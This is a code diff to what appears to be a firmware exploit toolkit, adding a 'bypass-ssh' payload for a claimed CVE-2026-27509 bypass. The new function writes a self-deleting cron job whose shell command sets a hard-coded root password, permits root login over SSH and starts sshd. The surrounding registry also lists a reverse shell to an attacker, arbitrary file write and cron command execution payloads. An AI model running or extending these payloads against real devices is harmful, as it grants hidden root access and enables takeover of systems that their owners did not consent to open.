@@ -412,6 +412,28 @@ def payload_bypass_escalate(unfiltered_code, hotkey="L1+Y"):
     )
 
 
+def payload_bypass_ssh(password="unleash", hotkey="L1+Y"):
+    """Enable SSH via cron job (CVE-2026-27509 bypass).
+
+    One-step SSH for firmware >= 1.1.14. Writes a cron job that sets the
+    root password, permits root login, and starts sshd. Cron fires within
+    60 seconds of the hotkey press, then self-deletes.
+    """
+    cmd = (
+        f"echo 'root:{password}' | chpasswd"
+        " && sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config"
+        " && systemctl enable ssh"
+        " && systemctl start ssh"
+        " && rm -f /etc/cron.d/ush"
+    )
+    p = payload_bypass_cron(
+        command=cmd, schedule="* * * * *", cron_name="ush", hotkey=hotkey,
+    )
+    p.name = "bypass-ssh"
+    p.description = f"Enable SSH via cron, root password={password} (firmware >= 1.1.14)"
+    return p
+
+
 PAYLOAD_REGISTRY = {
     "ssh": ("Enable SSH + set root password", payload_ssh),
     "reverse-shell": ("Reverse shell to attacker", payload_reverse_shell),
@@ -421,4 +443,5 @@ PAYLOAD_REGISTRY = {
     "bypass-file": ("Arbitrary file write (CVE-2026-27509 bypass)", payload_bypass_file),
     "bypass-cron": ("Cron job for cmd exec (CVE-2026-27509 bypass)", payload_bypass_cron),
     "bypass-escalate": ("Two-press self-overwrite (CVE-2026-27509 bypass)", payload_bypass_escalate),
+    "bypass-ssh": ("Enable SSH via cron (firmware >= 1.1.14)", payload_bypass_ssh),
 }
